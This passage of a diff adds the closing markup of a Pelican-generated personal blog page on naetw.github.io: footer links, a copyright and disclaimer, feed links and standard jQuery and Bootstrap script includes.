+      </p>
+      <hr/>
+
+
+
+  </div>
+            
+          </div>
+
+      </div>
+
+    </div>
+
+    <!-- TODO: make footer sticky -->
+    <footer class="container-fluid">
+      <div class="container">
+        <div class="row">
+
+            <div class="col-md-2">
+                <h5>Social</h5>
+                <ul class="list-unstyled">
+                  <li>  <a href="https://github.com/Naetw">
+      <i class="fa fa-github"></i>
+    GitHub
+  </a></li>
+                </ul>
+            </div>
+            <div class="col-md-2">
+                <h5>Links</h5>
+                <ul class="list-unstyled">
+                  <li>  <a href="http://getpelican.com/">
+      <img src="https://besticon-demo.herokuapp.com/icon?url=getpelican.com&size=16" width="16" height="16" class="icon" alt="getpelican.com icon"/>
+    Pelican
+  </a></li>
+                </ul>
+            </div>
+
+          <div class="col-md-2">
+            <h5>Browse content by</h5>
+            <ul class="list-unstyled">
+                <li><a href="https://naetw.github.io/categories/index.html"><i class="fa fa-tags"></i> Categories</a></li>
+                <li><a href="https://naetw.github.io/archives/index.html"><i class="fa fa-calendar"></i> Dates</a></li>
+                <li><a href="https://naetw.github.io/tags/index.html"><i class="fa fa-tag"></i> Tags</a></li>
+            </ul>
+          </div>
+
+          <div class="col-md-2 text-muted">
+            <h5>Copyright notice</h5>
+            <p>© Copyright 2016-2017 Naetw.</p>
+          </div>
+
+          <div class="col-md-2 text-muted">
+            <h5>Disclaimer</h5>
+              <p>All opinions expressed in this site are my own personal opinions and are not endorsed by, nor do they represent the opinions of my previous, current and future employers or any of its affiliates, partners or customers.</p>
+          </div>
+
+          <div class="col-md-2">
+              <h5>Feeds</h5>
+              <ul class="list-unstyled">
+                  <li><small><a href="https://naetw.github.io/feeds/all.atom.xml"><i class="fa fa-rss"></i> All posts (Atom)</a></small></li>
+                  <li><small><a href="https://naetw.github.io/feeds/write-up.atom.xml"><i class="fa fa-rss"></i> Category: write-up (Atom)</a></small></li>
+              </ul>
+          </div>
+
+        </div>
+      </div>
+
+      <h5 class="text-right"><a href="#"><i class="fa fa-arrow-up"></i> Back to top</a></h5>
+
+      <div class="container">
+        <div class="row col-md-12 text-muted text-center">
+          Site generated by <a href="https://getpelican.com"> Pelican</a>.<br/>
+          <a href="https://github.com/kdeldycke/plumage"> Plumage</a> theme by <a href="https://kevin.deldycke.com">Kevin Deldycke</a>.
+        </div>
+      </div>
+
+    </footer>
+
+
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/2.2.4/jquery.min.js"></script>
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/twitter-bootstrap/3.3.7/js/bootstrap.min.js"></script>
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/magnific-popup.js/1.1.0/jquery.magnific-popup.min.js"></script>
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/fitvids/1.1.0/jquery.fitvids.min.js"></script>
+    <script src="https://naetw.github.io/theme/js/jquery.mglass.js"></script>
+    <script src="https://naetw.github.io/theme/js/application.js"></script>
+
+  </body>
+</html>
